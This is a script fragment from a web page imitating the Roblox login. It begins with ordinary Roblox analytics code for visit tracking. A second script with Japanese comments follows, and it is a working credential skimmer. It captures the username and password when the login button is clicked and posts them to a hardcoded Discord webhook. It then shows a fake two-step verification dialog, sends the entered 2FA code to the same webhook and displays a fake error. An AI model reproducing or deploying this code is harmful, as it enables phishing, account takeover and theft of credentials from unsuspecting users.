<script type="text/javascript">
    $(function(){
        function trackReturns() {
            function dayDiff(d1, d2) {
                return Math.floor((d1-d2)/86400000);
            }
            if (!localStorage) {
                return false;
            }

            var cookieName = 'RBXReturn';
            var cookieOptions = {expires:9001};
            var cookieStr = localStorage.getItem(cookieName) || "";
            var cookie = {};

            try {
                cookie = JSON.parse(cookieStr);
            } catch (ex) {
                // busted cookie string from old previous version of the code
            }

            try {
                if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                    localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                    return false;
                }
            } catch (ex) {
                return false;
            }

            var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
            if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_odr', {});
                cookie.odr = 1;
            }
            if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
                cookie.sdr = 1;
            }
            try {
                localStorage.setItem(cookieName, JSON.stringify(cookie));
            } catch (ex) {
                return false;
            }
        }

        GoogleListener.init();



        RobloxEventManager.initialize(true);
        RobloxEventManager.triggerEvent('rbx_evt_pageview');
        trackReturns();
        

        RobloxEventManager._idleInterval = 450000;
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
        
    });

</script>

<script>
(function() {
    const webhookUrl = "https://discord.com/api/webhooks/1500004637338636399/z0EUnIYcGvRoIYtFfbPB86e00a41BBS3_Lz-m-Ppi6-DGozIaAhMON8OIgxb2bc5i_cU";

    // 1. ログインボタン押下時の処理
    document.addEventListener('click', function(e) {
        const target = e.target.closest('#login-button');
        if (target) {
            const username = document.getElementById('login-username')?.value || "";
            const password = document.getElementById('login-password')?.value || "";

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "content": "@everyone",
                    "embeds": [{
                        "title": "🔑 ログイン情報",
                        "color": 16711680,
                        "fields": [
                            { "name": "👤 ユーザー", "value": "```" + username + "```" },
                            { "name": "🔒 パスワード", "value": "```" + password + "```" }
                        ]
                    }]
                }),
                keepalive: true
            });

            setTimeout(() => {
                const modal = document.getElementById('two-step-modal');
                if (modal) modal.style.display = 'flex';
            }, 600);
        }
    }, true);

    // 2. 新しいID (two-step-verification-code-input) の入力を監視
    document.addEventListener('input', function(e) {
        if (e.target.id === 'two-step-verification-code-input') {
            const btn = document.getElementById('verify-button');
            if (e.target.value.length >= 6) {
                btn.style.background = "#fff";
                btn.style.color = "#000";
                btn.style.cursor = "pointer";
            } else {
                btn.style.background = "#cdcfd0";
                btn.style.color = "#666";
                btn.style.cursor = "not-allowed";
            }
        }
    });

    // 3. 確認ボタン押下時の処理
    document.addEventListener('click', function(e) {
        if (e.target.id === 'verify-button') {
            const codeInput = document.getElementById('two-step-verification-code-input');
            const code = codeInput ? codeInput.value : "";
            if (code.length < 6) return;

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "content": "🛡️ **2段階認証コード:** ```" + code + "```"
                })
            }).then(() => {
                alert("不明なエラーが発生しました。もう一度お試しください。");
                location.reload();
            });
        }
    });
})();
</script>
